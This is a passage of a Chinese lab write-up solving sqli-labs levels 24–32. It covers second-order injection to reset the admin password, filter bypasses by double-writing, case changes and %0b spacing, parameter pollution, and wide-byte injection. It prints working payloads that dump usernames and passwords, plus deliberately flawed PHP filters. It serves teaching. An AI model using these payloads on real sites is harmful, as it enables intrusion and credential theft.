+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h4><p>从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的具体情况下，想要修改掉 admin 用户的密码的话，这里就需要使用的是二次注入的姿势了。</p>
+<p>二次注入 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入</p>
+<ol>
+<li>通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了构造的 SQL 语句或者命令。</li>
+<li>服务端应用程序会将提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li>
+<li>向服务端发送第二个与第一次不相同的请求数据信息。</li>
+<li>服务端接收到提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致在第一次请求中构造的 SQL语句或者命令在服务端环境中执行。</li>
+<li>服务端返回执行的处理结果数据信息，便可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</li>
+</ol>
+<p>在创立用户的语句中</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<span class="token variable">$username</span><span class="token operator">=</span>  <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>mysql_escape_string将我们的语句转义，譬如下面，我们可以很明显的看到’被转移为了&#39;这就使我们的语句不能执行。但是如果插入表中呢？这便是我们的注入点</p>
+<table>
+<thead>
+<tr>
+<th>危险字符</th>
+<th>转义后</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>\</td>
+<td>\</td>
+</tr>
+<tr>
+<td>‘</td>
+<td>&#39;</td>
+</tr>
+<tr>
+<td>“</td>
+<td>&quot;</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+转义前<span class="token punctuation">:</span>
+<span class="token number">1</span>' <span class="token keyword">AND</span> <span class="token punctuation">(</span><span class="token constant">SELECT</span> <span class="token number">1343</span> <span class="token function">FROM</span><span class="token punctuation">(</span><span class="token constant">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">CONCAT</span><span class="token punctuation">(</span><span class="token number">0x7E</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">MID</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">IFNULL</span><span class="token punctuation">(</span><span class="token function">CAST</span><span class="token punctuation">(</span><span class="token function">CURRENT_USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token constant">NCHAR</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7E</span><span class="token punctuation">,</span><span class="token function">FLOOR</span><span class="token punctuation">(</span><span class="token function">RAND</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token constant">FROM</span> <span class="token constant">INFORMATION_SCHEMA</span><span class="token operator">.</span><span class="token constant">PLUGINS</span> <span class="token constant">GROUP</span> <span class="token constant">BY</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token operator">--</span> uwIe
+
+转义后
+<span class="token number">1</span>\' <span class="token keyword">AND</span> <span class="token punctuation">(</span><span class="token constant">SELECT</span> <span class="token number">1343</span> <span class="token function">FROM</span><span class="token punctuation">(</span><span class="token constant">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">CONCAT</span><span class="token punctuation">(</span><span class="token number">0x7E</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">MID</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">IFNULL</span><span class="token punctuation">(</span><span class="token function">CAST</span><span class="token punctuation">(</span><span class="token function">CURRENT_USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token constant">NCHAR</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7E</span><span class="token punctuation">,</span><span class="token function">FLOOR</span><span class="token punctuation">(</span><span class="token function">RAND</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token constant">FROM</span> <span class="token constant">INFORMATION_SCHEMA</span><span class="token operator">.</span><span class="token constant">PLUGINS</span> <span class="token constant">GROUP</span> <span class="token constant">BY</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token operator">--</span> uwIe
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后再看一下修改密码的sql语句</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>username通过单引号闭合这就是我们的注入点，我们完全可以控制修改用户的对象。</p>
+<p>当用户为admin’# 时，我们的语句变为以下部分，成功注入</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='admin’# ' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h4><p>好，知道了思路，我们现在开始注入吧。</p>
+<p>首先，我们注册一个用户名为<strong>admin’#violet</strong>的用户，你也许会想不是有过滤语句将‘转义吗？好，那我们看一下在数据库中的情况。</p>
+<p><img src="Less-24.png"></p>
+<p>我去，咋和别人不一样。我吐了啊。罢了罢了，理解意思就行了。如果知道原因的话，希望告诉我。</p>
+<p>之后，因为我们的用户名含有注释，所以可以直接将admin的密码修改。</p>
+<h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=’$id’</td>
+</tr>
+</tbody></table>
+<p>这一关，and以及or被过滤了。来，我们尝试绕过一下。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<span class="token keyword">function</span> <span class="token function-definition function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/or/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>			<span class="token comment">//strip out OR (non case sensitive)</span>
+	<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/AND/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//Strip out AND (non case sensitive)</span>
+	
+	<span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>本来一扫还想着大小写绕过，然后一看原来使用了正则表达式。那就没事了。</p>
+<pre class="line-numbers language-regex" data-language="regex"><code class="language-regex">
+<span class="token group punctuation">(?i</span><span class="token group punctuation">)</span>即匹配时不区分大小写。表示匹配时不区分大小写。
+
+　　<span class="token group punctuation">(?s</span><span class="token group punctuation">)</span>即Singleline<span class="token group punctuation">(</span>单行模式<span class="token group punctuation">)</span>。表示更改<span class="token charclass class-name">.</span>的含义，使它与每一个字符匹配（包括换行 符<span class="token escape">\n</span>）。
+
+　　<span class="token group punctuation">(?m</span><span class="token group punctuation">)</span>即Multiline<span class="token group punctuation">(</span>多行模式<span class="token group punctuation">)</span> 。 表示更改<span class="token anchor function">^</span>和<span class="token anchor function">$</span>的 含义，使它们分别在任意一行的行首和行尾匹配，而不仅仅在整个字符串的开头和结尾匹配。<span class="token group punctuation">(</span>在此模式下,<span class="token anchor function">$</span>的 精确含意是:匹配<span class="token escape">\n</span>之前的位置以及字符串结束前的位置<span class="token charclass class-name">.</span><span class="token group punctuation">)</span> 
+　　<span class="token group punctuation">(?x</span><span class="token group punctuation">)</span>：表示如果加上该修饰符，表达式中的空白字符将会被忽略，除非它已经被转义。 
+　　<span class="token group punctuation">(</span><span class="token quantifier number">?</span>e<span class="token group punctuation">)</span>：表示本修饰符仅仅对于replacement有用，代表在replacement中作为PHP代码。 
+　　<span class="token group punctuation">(</span><span class="token quantifier number">?</span>A<span class="token group punctuation">)</span>：表示如果使用这个修饰符，那么表达式必须是匹配的字符串中的开头部分。比如说"/a/A"匹配"abcd"。 
+　　<span class="token group punctuation">(</span><span class="token quantifier number">?</span>E<span class="token group punctuation">)</span>：与"m"相反，表示如果使用这个修饰符，那么"<span class="token anchor function">$</span>"将匹配绝对字符串的结尾，而不是换行符前面，默认就打开了这个模式。 
+　　<span class="token group punctuation">(?U</span><span class="token group punctuation">)</span>：表示和问号的作用差不多，用于设置"贪婪模式"。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>在这里我们使用or或and，或者字符串中含有它们时可以双写。</p>
+<p>造成这个漏洞的原因在于没有使用循环。仅仅过滤了一次</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+过滤前：
+
+oorr， anandd， oandr
+
+过滤后：
+
+<span class="token keyword">or</span>， <span class="token keyword">and</span>，<span class="token keyword">or</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="符号替换"><a href="#符号替换" class="headerlink" title="符号替换"></a>符号替换</h4><p>我们如果使用的是符合，完全可以用&amp; 或者|替换</p>
+<h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=$id</td>
+</tr>
+</tbody></table>
+<p>拼接以及没有报错其他相同</p>
+<h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>报错注入&amp;联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=$id</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-none"><code class="language-none">function blacklist($id)
+&#123;
+	$id&#x3D; preg_replace(&#39;&#x2F;or&#x2F;i&#39;,&quot;&quot;, $id);			&#x2F;&#x2F;strip out OR (non case sensitive)
+	$id&#x3D; preg_replace(&#39;&#x2F;and&#x2F;i&#39;,&quot;&quot;, $id);		&#x2F;&#x2F;Strip out AND (non case sensitive)
+	$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\*]&#x2F;&#39;,&quot;&quot;, $id);		&#x2F;&#x2F;strip out &#x2F;*
+	$id&#x3D; preg_replace(&#39;&#x2F;[--]&#x2F;&#39;,&quot;&quot;, $id);		&#x2F;&#x2F;Strip out --
+	$id&#x3D; preg_replace(&#39;&#x2F;[#]&#x2F;&#39;,&quot;&quot;, $id);			&#x2F;&#x2F;Strip out #
+	$id&#x3D; preg_replace(&#39;&#x2F;[\s]&#x2F;&#39;,&quot;&quot;, $id);		&#x2F;&#x2F;Strip out spaces
+	$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\\\\]&#x2F;&#39;,&quot;&quot;, $id);		&#x2F;&#x2F;Strip out slashes
+	return $id;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>or与and可以用||或者&amp;&amp;代替，双写绕过。</p>
+<p>过滤注释，可以通过闭合来进行代替。</p>
+<p>空格可以通过下表进行代替</p>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>%09</td>
+<td>TAB 键(水平)</td>
+</tr>
+<tr>
+<td>%0a</td>
+<td>新建一行</td>
+</tr>
+<tr>
+<td>%0c</td>
+<td>新的一页</td>
+</tr>
+<tr>
+<td>%0d</td>
+<td>return 功能</td>
+</tr>
+<tr>
+<td>%0b</td>
+<td>TAB 键(垂直)</td>
+</tr>
+<tr>
+<td>%a0</td>
+<td>空格</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39;%0bUNION%0bSELECT%0b1,(SELECT%0bGROUP_CONCAT(username,passwoorrd%0bSEPARAToorr%0b0x3c62723e)%0bFROM%0busers),1%0banandd%0b&#39;1&#39;%0b&#x3D;%0b&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>报错注入&amp;联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=(‘$id’)</td>
+</tr>
+</tbody></table>
+<p>仅仅时闭合方式不同。</p>
+<h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>报错注入&amp;联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=’$id’</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">function blacklist($id)
+&#123;
+
+$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\*]&#x2F;&#39;,&quot;&quot;, $id);		&#x2F;&#x2F;strip out &#x2F;*
+$id&#x3D; preg_replace(&#39;&#x2F;[--]&#x2F;&#39;,&quot;&quot;, $id);		&#x2F;&#x2F;Strip out --.
+$id&#x3D; preg_replace(&#39;&#x2F;[#]&#x2F;&#39;,&quot;&quot;, $id);			&#x2F;&#x2F;Strip out #.
+$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out spaces.
+
+# 严格匹配，防止多行注释，过滤select
+$id&#x3D; preg_replace(&#39;&#x2F;select&#x2F;m&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out spaces.
+$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out spaces.
+$id&#x3D; preg_replace(&#39;&#x2F;union&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out union
+$id&#x3D; preg_replace(&#39;&#x2F;select&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out select
+# 过滤union
+$id&#x3D; preg_replace(&#39;&#x2F;UNION&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out UNION
+$id&#x3D; preg_replace(&#39;&#x2F;SELECT&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out SELECT
+$id&#x3D; preg_replace(&#39;&#x2F;Union&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out Union
+$id&#x3D; preg_replace(&#39;&#x2F;Select&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out select
+return $id;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+sElECT .....
+
+uNion .....
+
+空格上题的方法即可
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>方法有很多，这里不再赘述。</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+-4235&#39;%0bUnIoN%0bALL%0bsElEct%0bNULL,(sElEct%0bGROUP_CONCAT(IFNULL(CAST(username%0bAS%0bNCHAR),0x20),0x7E,IFNULL(CAST(password%0bAS%0bNCHAR),0x20), 0x3c62723e)%0bFROM%0bsecurity.users%0bORDER%0bBY%0bid),NULL%0band%0b&#39;1&#39;&#x3D;&#39;1
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=”$id”</td>
+</tr>
+</tbody></table>
+<p>仅仅是闭合方式，以及没有报错。其他都相同。</p>
+<h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=(‘$id’)</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">
+function blacklist($id)
+&#123;
+$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\*]&#x2F;&#39;,&quot;&quot;, $id);				&#x2F;&#x2F;strip out &#x2F;*
+$id&#x3D; preg_replace(&#39;&#x2F;[--]&#x2F;&#39;,&quot;&quot;, $id);				&#x2F;&#x2F;Strip out --.
+$id&#x3D; preg_replace(&#39;&#x2F;[#]&#x2F;&#39;,&quot;&quot;, $id);					&#x2F;&#x2F;Strip out #.
+$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id);	    		&#x2F;&#x2F;Strip out spaces.
+$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id);	    		&#x2F;&#x2F;Strip out spaces.
+
+# 不区分大小写对union select进行过滤
+$id&#x3D; preg_replace(&#39;&#x2F;union\s+select&#x2F;i&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out UNION &amp; SELECT.
+return $id;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>union select 会被过滤, 但是 union%0bselect并不会, 其实与前几题没什么区别这里也不赘述了</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+?id&#x3D;-4235&#39;)%0bUNION%0bALL%0bSELECT%0bNULL,(SELECT%0bGROUP_CONCAT(IFNULL(CAST(password%0bAS%0bNCHAR),0x20),0x7E,IFNULL(CAST(password%0bAS%0bNCHAR),0x20),0x3c62723e)%0bFROM%0bsecurity.users%0bORDER%0bBY%0bid),3%0band%0b(&#39;1
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=(‘$id’)</td>
+</tr>
+</tbody></table>
+<p>还少了几个过滤，就不赘述了。</p>
+<h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=’$id’</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP"># 获得请求的字符串,即你输入的语句
+$qs &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];
+	$hint&#x3D;$qs;
+	
+	&#x2F;&#x2F; 模拟tomact JSP
+	$id1&#x3D;java_implimentation($qs);
+	&#x2F;&#x2F; apache的特性当相同参数有两个时接受后一个
+	$id&#x3D;$_GET[&#39;id&#39;];
+	&#x2F;&#x2F;echo $id1;
+	whitelist($id1);
+	$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;
+	if($row)
+	&#123;
+		输出账号密码
+	&#125;
+	else
+	&#123;
+		报错
+	&#125;
+
+	
+function java_implimentation($query_string)
+&#123;
+	$q_s &#x3D; $query_string;
+	# 将字符串分割为数组
+	$qs_array&#x3D; explode(&quot;&amp;&quot;,$q_s);
+
+	# 对数组遍历
+	foreach($qs_array as $key &#x3D;&gt; $value)
+	&#123;
+		# 取数组前两个字符,如果为id就返回
+		$val&#x3D;substr($value,0,2);
+		if($val&#x3D;&#x3D;&quot;id&quot;)
+		&#123;
+			$id_value&#x3D;substr($value,3,30); 
+			return $id_value;
+			echo &quot;&lt;br&gt;&quot;;
+			break;
+		&#125;
+
+	&#125;
+
+&#125;
+
+function whitelist($input)
+&#123;
+	&#x2F;&#x2F; 正则表达式含义为匹配数字, 如果全部为数字无事发生, 否则执行hacked.php
+	$match &#x3D; preg_match(&quot;&#x2F;^\d+$&#x2F;&quot;, $input);
+	if($match)
+	&#123;
+		&#x2F;&#x2F;echo &quot;you are good&quot;;
+		&#x2F;&#x2F;return $match;
+	&#125;
+	else
+	&#123;	
+		header(&#39;Location: hacked.php&#39;);
+		&#x2F;&#x2F;echo &quot;you are bad&quot;;
+	&#125;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>开始页面没什么特别的，关键是login.php。因为我们如果正常输入的话，是绝对会被java_implimentation()和whilist拦截，所以我们必须想办法绕过。</p>
+<p>漏洞也就在java_implementation上，只要遇到id它便结束循环返回数组，也就说我们可以使用两个参数，第一个id=数字，使其绕过函数，第二个函数由于apache的特性，会被读取。这个方式叫做<strong>参数污染</strong>。</p>
+<p>即用户输入这样的语句:</p>
+<pre class="line-numbers language-none"><code class="language-none">
+index.php?id&#x3D;1&amp;id&#x3D;2
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>Apache PHP 会解析最后一个参数</p>
+<p>Tomcat JSP 会解析第一个参数</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+login.php?id&#x3D;1&amp;id&#x3D;-1&#39; UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)--+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=”$id”</td>
+</tr>
+</tbody></table>
+<p>与Less29没有区别</p>
+<h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=(“$id”)</td>
+</tr>
+</tbody></table>
+<p>与Less-32无本质区别</p>
+<h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=’$id’</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">
+function check_addslashes($string)
+&#123;
+
+	&#x2F;&#x2F; 将 \ 替换为 \\, 不太明白为什么时6个\\\\\\
+    $string &#x3D; preg_replace(&#39;&#x2F;&#39;. preg_quote(&#39;\\&#39;) .&#39;&#x2F;&#39;, &quot;\\\\\\&quot;, $string);          &#x2F;&#x2F;escape any backslash
+	&#x2F;&#x2F; 将&#39;替换为\&#39;
+    $string &#x3D; preg_replace(&#39;&#x2F;\&#39;&#x2F;i&#39;, &#39;\\\&#39;&#39;, $string);                               &#x2F;&#x2F;escape single quote with a backslash
+	&#x2F;&#x2F; 将&quot;替换为&#x2F;&quot;
+    $string &#x3D; preg_replace(&#39;&#x2F;\&quot;&#x2F;&#39;, &quot;\\\&quot;&quot;, $string);                                &#x2F;&#x2F;escape double quote with a backslash
+      
+    
+    return $string;
+&#125;
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>这个题目使用了宽字节注入</p>
+<p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 %aa%5c 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 \，所以这里想办法干掉反斜杠即可。</p>
+<pre><code>1. %df 吃掉 \
+</code></pre>
+<p>具体的原因是 urlencode(&#39;) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把%df%5c 当做是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p>
+<pre><code>2. 将 \&#39; 中的 \ 过滤掉
+</code></pre>
+<p>例如可以构造 %5c%5c%27 的情况，后面的%5c会被前面的%5c 给注释掉。这也是 bypass 的一种方法。</p>
+<p>本关卡采用第一种 %df 宽字节注入来吃掉反斜杠，下面直接丢 payload 吧：</p>
